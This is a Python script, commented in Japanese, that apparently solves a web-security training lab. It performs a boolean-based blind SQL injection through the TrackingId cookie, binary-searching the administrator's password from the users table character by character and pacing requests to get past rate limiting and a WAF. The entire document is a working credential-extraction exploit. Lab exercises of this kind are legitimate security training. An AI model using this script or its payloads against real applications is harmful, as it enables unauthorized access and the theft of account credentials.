import requests
import time

# 対象ラボのURLとセッション情報。利用時に書き換える。
URL = "https://0ab20064049ecb65806144b100ff002e.web-security-academy.net/"
TRACKING_ID = "mmOUZRT0l4BrXYn6"
SESSION_ID = "HhEspVAg7osCnAaiPRqsSx72GjqnACVM"

# パスワードを構成しうる文字（小文字英数字を昇順に並べたもの）
CHARS = "0123456789abcdefghijklmnopqrstuvwxyz"
password = ""

print("二分探索によるパスワード抽出を開始します")

# 1文字目から20文字目まで順番に特定する
for i in range(1, 21):
    low = 0
    high = len(CHARS) - 1

    # 二分探索で対象文字を絞り込む
    while low <= high:
        mid = (low + high) // 2
        mid_char = CHARS[mid]

        # 正解文字が mid_char より大きいかを比較演算子 > で問い合わせる
        payload_greater = f"{TRACKING_ID}' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator') > '{mid_char}'-- -"
        cookies = {'TrackingId': payload_greater, 'session': SESSION_ID}

        # レート制限とWAFへの配慮として短い待機を挟む
        time.sleep(0.1)

        response = requests.get(URL, cookies=cookies)

        if "Welcome back" in response.text:
            # 真であれば正解文字は mid_char より後方にある
            low = mid + 1
        else:
            # 偽であれば mid_char と一致するか、より前方にある
            payload_equal = f"{TRACKING_ID}' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator') = '{mid_char}'-- -"
            cookies_equal = {'TrackingId': payload_equal, 'session': SESSION_ID}

            time.sleep(0.1)
            res_equal = requests.get(URL, cookies=cookies_equal)

            if "Welcome back" in res_equal.text:
                # 一致したのでこの文字で確定
                password += mid_char
                print(f"[*] {i}文字目を特定: {mid_char} (現在: {password})")
                break
            else:
                # 一致しない場合は正解文字はより前方にある
                high = mid - 1

print(f"[+] 最終パスワード: {password}")
